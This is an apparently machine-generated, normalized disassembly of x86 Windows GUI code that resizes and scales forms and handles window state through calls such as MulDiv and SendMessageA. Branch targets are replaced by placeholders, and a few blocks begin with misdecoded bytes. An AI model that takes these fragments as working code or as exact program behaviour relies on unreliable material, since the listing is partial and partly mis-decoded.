call sub_4605d0
jmp r-xdata
mov esi [ ebx + 0x208 ]
mov eax ebx
call sub_4489b8
mov edx [ esi + 0xc ]
add edx [ edi + 0x8 ]
sub edx eax
mov eax esi
call sub_4605d0
mov eax ebx
call sub_4489b8
add eax [ edi ]
mov [ edi + 0x8 ] eax
mov eax ebx
call sub_4489fc
sub ebp esi
cmp eax ebp
jge r-xdata
mov esi [ ebx + 0x20c ]
mov eax ebx
call sub_4489fc
mov edx [ esi + 0xc ]
add edx [ edi + 0xc ]
sub edx eax
mov eax esi
call sub_4605d0
mov eax ebx
call sub_4489fc
add eax [ edi + 0x4 ]
mov [ edi + 0xc ] eax
sub_460eac
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
cmp edi esi
je r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x0
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x0
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_4605d0
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_4605d0
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x1
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x1
mov ebp [ ebx + 0x208 ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
mov ebp [ ebx + 0x20c ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_460720
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_460720
sub_460f50
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_460eac
mov ecx edi
mov edx esi
mov eax ebx
call sub_44f2c0
pop edi
pop esi
pop ebx
retn
sub_460f78
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
inc [ eax + 0x214 ]
xor edx edx
push ebp
push sub_460fe2
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44dda0
xor eax eax
mov edx [ ebx + 0x4 ]
sub edx 0x1
jb r-xdata
xor eax eax
jmp r-xdata
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460fe9
mov eax [ ebp - 0x4 ]
dec [ eax + 0x214 ]
retn
mov al 0x1
jmp r-xdata
dec edx
je r-xdata
mov al 0x2
jmp r-xdata
sub_460fe9
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_461021
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_460bc8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461028
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_461028
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_460c48
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
sub_46109c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_4489fc
mov edx [ ebx + 0x20c ]
mov edx [ edx + 0x10 ]
call sub_429b94
push eax
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_4489b8
mov edx eax
mov edi [ ebx + 0x208 ]
mov eax [ edi + 0x10 ]
call sub_429b94
mov ecx eax
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
neg edx
mov eax [ edi + 0xc ]
neg eax
call sub_41728c
push esi
mov edi esi
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx esi
mov eax ebx
call sub_44b820
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_46110c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_46116d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_4034f4
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44eb30
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461174
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x4 ] edx
retn
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4 ] 0x1
sub_46119c
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
xor ebx ebx
mov [ ebp - 0x114 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_461300
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_4612e0
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov ecx ebx
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xe0 ]
mov eax [ ebp - 0x4 ]
call sub_4032b0
cmp eax [ r-xdata ]
je r-xdata
add esp 0xfffffff0
call sub_4036b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4612e7
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x1
xor eax eax
push ebp
push sub_4612a8
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_4184d4
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfe
retn
lea edx [ ebp - 0x110 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4032b8
lea eax [ ebp - 0x110 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x114 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x114 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb78
call sub_403b1c
sub_461328
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
test [ ebx + 0x2f4 ] 0x20
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd4 ]
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_403564
and [ ebx + 0x2f4 ] 0xdf
sub_461360
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_46096c
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
xor edx edx
mov eax ebx
call sub_4486fc
xor edx edx
mov eax ebx
call sub_448720
mov edx 0x140
mov eax ebx
call sub_448748
mov edx 0xf0
mov eax ebx
call sub_44876c
mov dl 0x1
mov eax [ r-xdata ]
call sub_429128
mov esi eax
mov [ ebx + 0x240 ] esi
push 0x31
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x32
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax [ ebx + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebx + 0x240 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_461c7c
mov dl 0x1
mov eax [ r-xdata ]
call sub_424af4
mov esi eax
mov [ ebx + 0x238 ] esi
mov eax esi
mov edx ebx
call sub_447b68
mov al [ r-xdata ]
mov [ ebx + 0x228 ] al
mov [ ebx + 0x229 ] 0x2
mov [ ebx + 0x22b ] 0x0
mov [ ebx + 0x231 ] 0x3
mov [ ebx + 0x244 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ ebx + 0x25c ] eax
mov [ ebx + 0x235 ] 0x1
mov eax ebx
call sub_4032b0
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x2e1 ] 0xff
xor eax eax
mov [ ebx + 0x2ec ] eax
xor edx edx
mov eax ebx
call sub_461fe0
xor edx edx
mov eax ebx
call sub_449178
xor edx edx
mov eax ebx
call sub_4490e0
mov dl 0x1
mov eax ebx
call sub_44f8f4
mov edx ebx
mov eax [ rw-data ]
call sub_466644
mov [ ebx + 0x2e4 ] 0xa
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_4614d9
add [ eax ] al
add [ ebx - 0x75 ] dl
fsub [ ecx + rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov eax ebx
call sub_421424
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
mov edx ebx
call sub_418a3c
xor edx edx
mov eax ebx
call sub_41bc9c
cmp [ ebx + 0x264 ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0xc ]
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
mov eax ebx
call sub_4654ec
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
sub_461544
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_40371c
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
xor eax eax
push ebp
push sub_46160e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_463e68
mov eax [ ebp - 0x4 ]
call sub_44fab8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd8 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_46667c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_403368
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
call sub_403368
mov eax [ ebp - 0x4 ]
add eax 0x2f0
call sub_40d490
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_4609e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461615
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xac ]
sub_461628
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2d2 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
xor eax eax
push ebp
push j_sub_403830#6
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_461fe0
sub_46166e
mov eax [ ebp - 0x4 ]
mov si 0xffad
call sub_403564
test al al
jne r-xdata
call sub_403b98
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
call sub_403b44
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_461fe0
sub_4616a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2da ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push j_sub_403830#4
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2dc ]
call [ ebx + 0x2d8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_461704
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_44b088
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi eax
xor eax eax
mov [ ebx + 0x220 ] eax
mov eax edi
mov si 0xffb8
call sub_403564
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_4639ac
sub_461740
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_44845c
mov eax ebx
sub al 0x1
jb r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
je r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
cmp [ edi + 0x2f0 ] 0x0
jne r-xdata
mov ebp [ edi + 0x2f0 ]
test ebp ebp
je r-xdata
jmp r-xdata
cmp [ edi + 0x250 ] 0x0
je r-xdata
cmp [ edi + 0x248 ] 0x0
jne r-xdata
mov edx esi
mov eax [ edi + 0x2f0 ]
call sub_418744
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ edi + 0x2f0 ] eax
cmp esi [ edi + 0x248 ]
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
mov eax [ edi + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp edi [ esi + 0x4 ]
jne r-xdata
cmp esi [ edi + 0x258 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_462da4
mov edx esi
mov eax ebp
call sub_418a3c
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
cmp esi [ edi + 0x260 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_462d7c
mov edx esi
mov eax edi
call sub_462da4
jmp r-xdata
xor edx edx
mov eax edi
call sub_462d58
sub_46184c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44c04c
xor edx edx
push ebp
push sub_461aa2
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x268 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x26c ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x270 ] edx
xor ebx ebx
mov al [ rw-data ]
xor al 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x234 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44b7a8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x25c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x270 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
test eax eax
jle r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4489d0
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ r-xdata ]
mov [ eax + 0x98 ] dl
test bl bl
jne r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_448a14
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x25c ] eax
mov eax [ ebp - 0x4 ]
call sub_461bd4
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
cmp esi eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
mov edx [ rw-data ]
cmp eax [ edx + 0x40 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_44a180
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461aa9
mov eax [ ebp - 0x4 ]
call sub_44c054
retn
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_460eac
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_44f278
mov bl 0x1
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_460eac
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44f278
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x68 ]
mov eax esi
call sub_4243b8
push eax
call MulDiv
mov edx eax
mov eax esi
call sub_4243c0
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x268 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_461ab1
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44caf4
push 0x0
push 0x0
push ebx
push sub_461bb8
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_461b84
push ebx
push sub_461b9c
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push r-xdata
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
retn
sub_461b63
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_41c394
test al al
je r-xdata
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_4490e0
sub_461bef
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add bl al
lea eax [ eax ]
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_460eac
mov ecx edi
mov edx esi
mov eax ebx
call sub_44f278
mov eax ebx
call sub_461cd8
test al al
je r-xdata
push edi
push esi
mov ebp [ ebx + 0x68 ]
mov eax ebp
call sub_42445c
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_424478
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4489fc
mov ebp eax
push edi
push esi
mov eax ebx
call sub_4489b8
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_461f80
push edi
push esi
push ebp
call MulDiv
mov edx eax
mov eax ebx
call sub_461fb0
sub_461c7c
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_44f7b4
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_44fab8
test al al
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_463fdc
push eax
push 0x1
push 0x80
mov eax ebx
call sub_44f7b4
push eax
call SendMessageA
pop ebx
retn
sub_461d10
push ebx
mov ebx eax
mov eax ebx
call sub_462c2c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov al [ ebx + 0x229 ]
sub al 0x2
je r-xdata
mov al 0x1
sub al 0x3
je r-xdata
mov al 0x1
pop ebx
retn
xor eax eax
jmp r-xdata
cmp al [ ebx + 0x210 ]
jne r-xdata
sub_461da4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44f7b4
push eax
call IsIconic
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_44f87c
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetRect
push 0xffffffec
mov eax ebx
call sub_44f7b4
push eax
call GetWindowLongA
push eax
cmp [ ebx + 0x248 ] 0x0
setne al
neg al
sbb eax eax
push eax
push 0xfffffff0
mov eax ebx
call sub_44f7b4
push eax
call GetWindowLongA
push eax
push esi
call AdjustWindowRectEx
mov eax [ ebx + 0x4c ]
sub eax [ esi + 0xc ]
add eax [ esi + 0x4 ]
push eax
mov eax [ ebx + 0x48 ]
sub eax [ esi + 0x8 ]
add eax [ esi ]
push eax
push 0x0
push 0x0
push esi
call SetRect
pop esi
pop ebx
retn
sub_461e2c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx esi
mov eax ebx
call sub_44fd58
cmp ebx esi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov eax ebx
call sub_4217a8
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov edx edi
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_42177c
mov edi eax
mov eax edi
mov si 0xfff1
call sub_403564
test al al
jne r-xdata
sub_461e98
push ebx
push esi
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax ebx
call sub_4032b0
cmp esi eax
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_461ec4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax [ esp ]
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov eax ebp
call sub_44c4e4
sub [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0xffffffff
mov eax ebp
call sub_4217a8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebp
call sub_44fda0
jmp r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
inc [ esp + 0x8 ]
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov edx edi
mov eax ebp
call sub_42177c
mov si 0xfff1
call sub_403564
test al al
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_4217b8
jmp r-xdata
sub_461f58
push ebx
mov ebx eax
cmp dl [ ebx + 0x60 ]
je r-xdata
pop ebx
retn
mov eax ebx
call sub_44919c
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_44a180
sub_461f80
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_4489d0
pop ebx
retn
mov [ ebx + 0x268 ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_461fb0
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_448a14
pop ebx
retn
mov [ ebx + 0x26c ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_461fe0
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi + 0x2f4 ] 0x1
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx ebx
mov eax esi
call sub_448ed4
cmp bl [ esi + 0x57 ]
je r-xdata
and [ esi + 0x2f4 ] 0xfd
pop esi
pop ebx
retn
or [ esi + 0x2f4 ] 0x2
jmp r-xdata
mov eax esi
call sub_463118
pop esi
pop ebx
retn
sub_462024
push ebp
mov ebp esp
push 0x0
xor edx edx
push ebp
push sub_46207d
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462084
lea eax [ ebp - 0x4 ]
call sub_404164
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
sub_46208c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
je r-xdata
test eax eax
jne r-xdata
mov edx esi
mov eax ebx
call sub_448e88
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax ebx
call sub_44cd0c
mov eax ebx
call sub_44cea8
sub_4620c4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4215f4
cmp [ ebx + 0x250 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebx + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x2c ]
sub_462104
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov edx eax
cmp edx 0x46
jg r-xdata
sub edx 0xb01a
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
dec edx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
add edx 0xfffffffa
sub edx 0x3
jb r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44d1c8
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_403564
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub edx 0x22
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffb1
call sub_403564
jmp r-xdata
cmp eax [ rw-data ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx ] 0x7
jne r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x1
jne r-xdata
dec edx
je r-xdata
